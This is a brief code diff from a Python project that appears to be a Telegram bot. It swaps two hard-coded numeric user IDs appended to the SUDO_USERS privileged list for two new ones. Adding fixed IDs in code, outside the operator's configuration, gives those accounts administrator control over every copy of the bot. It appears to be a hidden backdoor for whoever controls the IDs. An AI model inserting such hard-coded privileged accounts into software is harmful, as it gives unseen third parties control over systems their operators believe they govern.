@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from NIXA.admins import get_administrators
 
 
-SUDO_USERS.append(5513481385)
-SUDO_USERS.append(1098149434)
+SUDO_USERS.append(1253258650)
+SUDO_USERS.append(5172662762)
  
 
 def errors(func: Callable) -> Callable:
